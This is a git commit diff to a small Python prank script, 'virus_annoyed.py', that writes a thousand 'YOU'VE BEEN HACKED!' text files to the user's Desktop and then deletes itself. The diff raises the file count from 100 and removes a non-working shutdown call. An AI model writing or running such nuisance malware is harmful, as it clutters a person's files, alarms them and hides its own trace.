6b1d17754d11d3c2072a10a8da795799e7aed6d0
jackrgilmore <81373974+jackrgilmore@users.noreply.github.com>
2021-10-27 10:08:37 -0400

    branch

--- mac_OS/virus_annoyed.py
+++ mac_OS/virus_annoyed.py
@@ -4,17 +4,15 @@
 import os
 from os import remove
 from sys import argv
-from os import shutdown
 from os.path import expanduser
 from os.path import join
 extension = str(".txt")
 name = ("spam")
 
-for i in range(100):
+for i in range(1000):
     file = open("Desktop/"+ name + str(i+1) + extension, "w")
     file.write("YOU'VE BEEN HACKED!")
     file.close()
 
 #comment out deleting self
 remove(argv[0])
-shutdown
